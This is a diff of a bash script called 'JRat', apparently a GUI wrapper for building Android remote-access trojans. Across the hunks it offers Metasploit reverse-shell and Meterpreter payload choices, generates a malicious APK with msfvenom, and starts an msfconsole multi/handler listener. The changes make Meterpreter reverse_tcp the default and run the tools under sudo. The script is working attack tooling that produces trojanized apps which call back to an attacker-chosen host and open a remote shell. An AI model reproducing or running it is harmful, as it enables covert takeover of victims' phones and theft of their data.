@@ -183,11 +183,11 @@ function get_lport()
 #function payload
 function get_payload()
 {
-  PAYLOAD=$(zenity --list --title " JRat " --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter_reverse_tcp" FALSE "android/meterpreter_reverse_http" FALSE "android/meterpreter_reverse_https" --width 260 --height 360 2> /dev/null)
+  PAYLOAD=$(zenity --list --title " JRat " --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" FALSE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" TRUE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter_reverse_tcp" FALSE "android/meterpreter_reverse_http" FALSE "android/meterpreter_reverse_https" --width 260 --height 360 2> /dev/null)
 }
 function get_payload1()
 {
-  PAYLOAD=$(zenity --list --title " JRat " --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" --width 200 --height 400 2> /dev/null)
+  PAYLOAD=$(zenity --list --title " JRat " --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" FALSE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" TRUE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" --width 200 --height 400 2> /dev/null)
 }
 #function name
 function payload_name()
@@ -255,7 +255,7 @@ done
 #function listeners
 function listener()
 {
-  xfce4-terminal -e "msfconsole -x 'use multi/handler; set LHOST $lanip; set LPORT $LPORT; set PAYLOAD $PAYLOAD; exploit -j'"
+  xfce4-terminal -e "sudo msfconsole -x 'use multi/handler; set LHOST $lanip; set LPORT $LPORT; set PAYLOAD $PAYLOAD; exploit -j'"
 }
 #function generate apk
 function gen_payload()
@@ -263,7 +263,7 @@ function gen_payload()
  echo -e $yellow ""
  echo "[*] Generating apk payload"
  spinlong
- xterm -T " GENERATE APK PAYLOAD" -fa monaco -fs 10 -bg black -e msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
+ xterm -T " GENERATE APK PAYLOAD" -fa monaco -fs 10 -bg black -e sudo msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
 }
 #function clean files
 function clean()
@@ -342,6 +342,7 @@ function main()
                 get_payload
                 echo
                 listener
+                clear
                 echo
                 ;;
             c)  echo -e $lightgreen "[✔] clean up all files"
